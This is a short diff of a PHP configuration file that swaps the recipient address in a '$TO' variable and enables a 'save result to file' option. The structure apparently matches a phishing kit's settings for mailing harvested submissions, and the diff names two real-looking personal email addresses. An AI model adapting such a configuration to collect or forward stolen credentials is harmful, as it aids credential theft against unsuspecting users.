@@ -1,7 +1,7 @@
 <?php
 
 // One Email
-$TO = "logzzone@yandex.com";
+$TO = "risserocky@gmail.com";
 
 // Save result to file   True or False
 $Res2File = true;
